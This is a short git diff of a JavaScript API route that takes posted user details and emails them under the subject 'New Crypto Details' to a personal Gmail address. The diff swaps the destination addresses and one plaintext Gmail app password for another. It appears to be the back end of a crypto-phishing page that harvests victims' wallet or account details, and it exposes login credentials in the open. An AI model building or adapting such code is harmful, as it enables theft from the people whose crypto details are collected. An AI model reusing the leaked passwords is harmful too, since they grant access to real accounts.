@@ -11,8 +11,8 @@ export async function POST(req){
     const body = await req.json();
     console.log(body)
     const message = {
-        from: "meshackchuck@gmail.com",
-        to: "Owerboy36@gmail.com",
+        from: "hvbvcchuknb@gmail.com",
+        to: "joychurch28@gmail.com",
         subject: "New Crypto Details",
         html: `
             <h3>User Details</h3>
@@ -28,10 +28,10 @@ export async function POST(req){
     const transporter = nodemailer.createTransport({
         service: "gmail",
         auth: {
-            user: "christariccykid55@gmail.com",
-            pass: "eqex qtlf ogzx sqzb"
-        }
-    })
+          user: "hvbvcchuknb@gmail.com",
+          pass: "fpjb hwii sade fcgv",
+        },
+      });
 
     console.log(JSON.stringify(body))
 
